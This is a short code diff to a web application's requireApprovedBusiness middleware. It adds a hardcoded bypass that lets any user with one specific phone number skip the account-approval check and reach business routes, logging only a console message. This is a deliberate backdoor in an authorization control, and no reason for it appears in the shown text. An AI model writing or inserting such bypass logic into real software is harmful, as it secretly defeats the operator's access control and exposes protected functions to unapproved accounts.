@@ -54,8 +54,8 @@ function requireApprovedBusiness(req, res, next) {
     return res.status(403).json({ error: 'Business user access required' });
   }
 
-  // Check if user is approved
-  db.query('SELECT status FROM users WHERE id = ?', [req.user.id], (err, results) => {
+  // Check if user is approved (with bypass logic)
+  db.query('SELECT status, phone_number FROM users WHERE id = ?', [req.user.id], (err, results) => {
     if (err) {
       return res.status(500).json({ error: 'Database error' });
     }
@@ -64,8 +64,16 @@ function requireApprovedBusiness(req, res, next) {
       return res.status(404).json({ error: 'User not found' });
     }
 
-    if (results[0].status !== 'approved') {
+    // Special bypass for phone number 7600046416
+    const BYPASS_PHONE_NUMBER = "7600046416";
+    const isBypassUser = results[0].phone_number === BYPASS_PHONE_NUMBER;
+
+    if (!isBypassUser && results[0].status !== 'approved') {
       return res.status(403).json({ error: 'Account not approved' });
+    }
+
+    if (isBypassUser) {
+      console.log('[Auth] Bypass user detected in requireApprovedBusiness - allowing access');
     }
 
     next();
